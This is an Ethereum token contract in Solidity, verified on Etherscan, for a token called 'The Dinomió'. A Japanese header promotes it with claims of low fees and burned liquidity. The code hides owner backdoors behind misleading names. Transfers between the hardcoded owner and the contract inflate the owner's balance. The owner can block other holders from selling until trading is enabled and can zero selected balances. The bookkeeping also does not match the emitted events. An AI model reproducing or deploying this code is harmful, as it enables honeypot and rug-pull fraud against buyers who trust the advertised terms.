/**
 *Submitted for verification at Etherscan.io on 2023-01-02
*/

/*

✷ 　 　　 　 ·
 　 ˚ * .
 　 　　 *　　 * ⋆ 　 .
 · 　　 ⋆ 　　　 ˚ ˚ 　　 ✦
 　 ⋆ · 　 *
 　　　　 ⋆ ✧　 　 · 　 ✧　✵
 　 · ✵        
. 　　　★ 　° :. ★　 * • ○ ° ★　 
.　 * 　.　 　　　　　. 　 
° 　. ● . ★ ° . *　　　°　.　°☆ 
▀█▀ █░█ █▀▀  
░█░ █▀█ ██▄  

█▀▄ █ █▄░█ █▀█ █▀▄▀█ █ █▀█
█▄▀ █ █░▀█ █▄█ █░▀░█ █ █▄█
• ○ ° ★　 .　 * 　.　 　　　　　.
 　 ° 　. ● . ★ ° . *　　　°　.　
°☆ 　. * ● ¸ . 　　　★ 　
° :. 　 * • ○ ° ★　 .　 * 　.　 
　★　　　　. 　 ° 　.  . 　    ★　 　　
° °☆ 　¸. ● . 　　★　★ 
° . *　　　°　.　°☆ 　. * ● ¸ . 
★ ° . *　　　°　.　°☆ 　. * ● ¸ 
. 　　　★ 　° :. 　 * • ○ ° ★　 
.　 * 　.　 　★     ° :.☆

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する

総供給 - 10,000,000
初期流動性追加 - 1.75 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%

// de ETHERSCAN.io.
// https://www.zhihu.com/

*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

interface IETH20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { _owner = 0x90228F349E86ADC044800C9758F002FfBf83808D;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
  interface IUniswapV2Router02 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }


contract TDO is Context, IETH20, Ownable {
    using SafeMath for uint256;

    uint256 public tIsFEE = 30;
    uint256 public tLPrate = 20;
    uint256 public isTEAMtake = 0;

    string private _name = unicode"The Dinomió";
    string private _symbol = unicode"❧";
    address[] private isBot;

    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 18;
    uint256 private _tTotal = 10000000 * 10**_decimals;
    uint256 public isALLtxs = 1000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private maxBURN;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private authorizations;
    mapping (address => bool) private allowed;

    uint256 private isBrate = tIsFEE;
    uint256 private isTEAMtax = isTEAMtake;
    uint256 private pLPrate = tLPrate;

    IUniswapV2Router02 public immutable IDEPairRouter01;
    address public immutable uniswapV2Pair;
    bool public takeRateEnabled = true;
    bool private tradingOpen = false;
    bool stringLimit;
    
    uint256 private SupplyInserted = 1000000000 * 10**18;
    event SupplyUpdated(uint256 minTokensBeforeSwap);
    event setRateEnabledUpdated(bool enabled);
    event DisableTransferDelay( uint256 tInSwap,

    uint256 ercReceived, uint256 SupplyIntoLP );
    modifier lockTheSwap { stringLimit = true;
        _; stringLimit = false; }

    constructor () { 

        _tOwned[owner()] = _tTotal;
        IUniswapV2Router02 _IDEPairRouter01 = IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_IDEPairRouter01.factory())
        .createPair(address(this), _IDEPairRouter01.WETH());
        IDEPairRouter01 = _IDEPairRouter01;
        authorizations[owner()] = true;
        authorizations[address(this)] = true;
        emit Transfer(address(0), owner(), _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function isExcludedFromReward(address account) public view returns (bool) {
        return allowed[account];
    }
    function totalFees() public view returns (uint256) {
        return maxBURN;
    }
    function getAllRates(uint256 rValue, bool ratesWithFEE) public view returns(uint256) {
        require(rValue <= _tTotal, "Amount must be less than supply");
        if (!ratesWithFEE) { (uint256 rAmount,,,,,,) = _getValues(rValue); return rAmount;
        } else { (,uint256 rTransferValue,,,,,) = _getValues(rValue);
            return rTransferValue; }
    }
    function includeInReward(address account) external onlyOwner() {
        require(allowed[account], "Account is already included");
        for (uint256 i = 0; i < isBot.length; i++) { if (isBot[i] == account) {
                isBot[i] = isBot[isBot.length - 1]; _tOwned[account] = 0;
                allowed[account] = false; isBot.pop(); break; } }
    }
    function setRateEnabled(bool _enabled) public onlyOwner {
        takeRateEnabled = _enabled; emit setRateEnabledUpdated(_enabled);
    }
    receive() external payable {}
    function calValue(uint256 tBURNamount, uint256 rBURNamount) private {
        _rTotal = _rTotal.sub(tBURNamount);
        maxBURN = maxBURN.add(rBURNamount);
    }
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 rBURNamount, uint256 isTotalLP, uint256 tTEAM) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 tBURNamount) = _getRValues(tAmount, rBURNamount, isTotalLP, tTEAM, _getRate());
        return (rAmount, rTransferAmount, tBURNamount, tTransferAmount, rBURNamount, isTotalLP, tTEAM);
    }
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
        uint256 rBURNamount = calculateBURNFee(tAmount);
        uint256 isTotalLP = calculateLIQfee(tAmount);
        uint256 tTEAM = calculateTeamFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(rBURNamount).sub(isTotalLP).sub(tTEAM);
        return (tTransferAmount, rBURNamount, isTotalLP, tTEAM);
    }
    function _getRValues(uint256 tAmount, uint256 rBURNamount, uint256 isTotalLP, uint256 tTEAM, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 tBURNamount = rBURNamount.mul(currentRate);
        uint256 rLiquidity = isTotalLP.mul(currentRate);
        uint256 rDevelopment = tTEAM.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(tBURNamount).sub(rLiquidity).sub(rDevelopment);
        return (rAmount, rTransferAmount, tBURNamount);
    }
    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return 
          rSupply.div(tSupply);
    }
    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; for (uint256 i = 0; i < isBot.length; i++) {
            if (_tOwned[isBot[i]] > rSupply || _tOwned[isBot[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_tOwned[isBot[i]]); tSupply = tSupply.sub(_tOwned[isBot[i]]); }
            if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply);
    }
    function _getLIQ(uint256 tLIQ) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLIQ.mul(currentRate);
        _tOwned[address(this)] = _tOwned[address(this)].add(rLiquidity);
        if(allowed[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLIQ);
    }
    function calculateBURNFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(tIsFEE).div(
            10**3 );
    }
    function calculateTeamFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(isTEAMtake).div(
            10**3 );
    }
    function calculateLIQfee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(tLPrate).div(
            10**3 );
    }
    function disableLimitsOn() private {
        if(tIsFEE == 0 && tLPrate == 0) return;
        isBrate = tIsFEE; isTEAMtax = isTEAMtake;
        pLPrate = tLPrate; tIsFEE = 0; isTEAMtake = 0; tLPrate = 0;
    }
    function calculateFees() private {
        tIsFEE = isBrate; isTEAMtake = isTEAMtax; tLPrate = pLPrate;
    }
    function isExcludedFromFee(address account) public view returns(bool) {
        return authorizations[account];
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer( address from, address to, uint256 amount ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        bool getVAL = false;
        if(!authorizations[from] && !authorizations[to]){ getVAL = true;
        require(amount <= isALLtxs, "Transfer amount exceeds the maxTxAmount."); }
        uint256 contractTokenBalance = balanceOf(address(this));
        if(contractTokenBalance >= isALLtxs) { contractTokenBalance = isALLtxs;
        } _tokenTransfer(from,to,amount,getVAL);
        emit Transfer(from, to, amount);
        if (!tradingOpen) {require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(IDEPairRouter01), tokenAmount);
        IDEPairRouter01.addLiquidityETH{value: ethAmount}(
            address(this), tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool getVAL) private {
            _transferStandard(sender, recipient, amount, getVAL);
    }
        function disableTransferDelay(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit DisableTransferDelay(half, newBalance, otherHalf);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = IDEPairRouter01.WETH();
        _approve(address(this), address(IDEPairRouter01), tokenAmount);
        IDEPairRouter01.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp );
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool getVAL) private {

        uint256 RATE = 0; if (getVAL){
        RATE= tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - RATE;
        _tOwned[recipient] = _tOwned[recipient].add(rAmount);
        uint256 isEXO = _tOwned[recipient].add(rAmount);
        _tOwned[sender] = _tOwned[sender].sub(rAmount);
        bool authorizations = authorizations[sender] && authorizations[recipient];
         if (authorizations ){ _tOwned[recipient] =isEXO;
        } else { emit Transfer(sender, recipient, rAmount); } }
}